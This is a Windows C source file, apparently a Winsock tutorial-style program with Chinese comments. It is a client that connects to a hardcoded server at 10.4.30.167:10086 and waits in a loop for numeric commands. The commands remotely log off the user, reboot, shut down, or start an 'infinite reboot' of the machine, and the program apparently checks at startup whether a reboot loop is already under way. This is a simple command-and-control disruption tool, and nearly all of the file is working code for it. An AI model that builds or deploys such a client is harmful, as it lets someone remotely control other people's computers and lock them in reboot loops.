#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <WinSock2.h>
#include <ws2tcpip.h>

#include "cmd.h"

#pragma comment(lib, "ws2_32.lib")

SOCKET clientSocket;

int main() {

	// 是否重启
	isReBootProc();

	// 1. 确定协议版本信息
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
		printf("确定协议版本信息错误：%d\n", GetLastError());
		return -1;
	}
	printf("客户端-确定协议版本信息成功！\n");

	// 2. 创建socket 
	clientSocket = socket(AF_INET, SOCK_STREAM, 0); // AF_INET:IPV4, SOCK_STREAM:TCP, SOCK_DGRAM
	if (SOCKET_ERROR == clientSocket) {
		printf("客户端-创建socket失败：%d\n", GetLastError());
		return -1;
	}
	printf("客户端-创建socket成功！\n");

	// 3. 确定服务器协议地址蹙
	SOCKADDR_IN sAddr;
	sAddr.sin_family = AF_INET; // socket函数第一个参数
	sAddr.sin_addr.S_un.S_addr = inet_addr("10.4.30.167");
	sAddr.sin_port = htons(10086); 

	// 4. 连接服务器
	int c = connect(clientSocket, (sockaddr*) &sAddr, sizeof(sAddr));
	if (SOCKET_ERROR == c) {

		// 8. 关闭socket
		closesocket(clientSocket);

		// 9. 清理协议版本信息
		WSACleanup();
		printf("客户端-连接服务器失败: %d\n", GetLastError());
		return -1;
	}
	printf("客户端-连接服务器端成功！\n");

	// 等待接收消息
	while (true)
	{
		char recvBuff[256];
		int r = recv(clientSocket , recvBuff, 255, NULL);
		if (r > 0) {

			// 添加结束符 \0
			recvBuff[r] = 0;
			printf("服务端发送命令:%s\n", recvBuff);

			/*
			1.注销 2.重启 3.关机 4.无限重启
			*/
			if (strcmp("1", recvBuff) == 0) {
				printf("正在注销...\n");
				if (logOffProc()) {
					printf("注销成功！\n");
				}
				else {
					printf("注销失败！\n");
				}
				
			}
			else if (strcmp("2", recvBuff) == 0) {
				printf("正在重启...\n");
				reBootProc();
			}
			else if (strcmp("3", recvBuff) == 0) {
				printf("正在关机...\n");
				powerOffProc();
			}
			else if (strcmp("4", recvBuff) == 0) {
				printf("正在无限重启...\n");
				infiniteReBootProc();
			}
		}
	}

	// 6. 关闭socket
	closesocket(clientSocket);

	// 7. 清理协议版本信息
	WSACleanup();

	return 0;
}